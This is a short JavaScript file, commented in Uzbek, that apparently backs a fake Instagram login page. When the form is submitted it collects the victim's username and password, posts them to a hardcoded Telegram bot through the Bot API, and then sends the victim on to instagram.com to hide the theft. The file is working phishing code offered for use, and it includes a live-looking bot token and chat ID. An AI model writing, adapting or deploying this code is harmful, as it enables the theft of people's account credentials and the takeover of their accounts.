const botToken = "7769199888:AAGnDSyMMBFMvD00w1Iu-D2klCFtp7f7nqo"; // Telegram bot tokeningizni bu yerga yozing
const chatId = "1886251346"; // Telegram chat IDingizni bu yerga yozing

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;  

  const message = `Login ma'lumotlari: Username: ${username} Password: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
    window.location.href = "https://www.instagram.com";
  } catch (error) {
    alert('Xatolik yuz berdi.');
    console.error(error);
  }  
});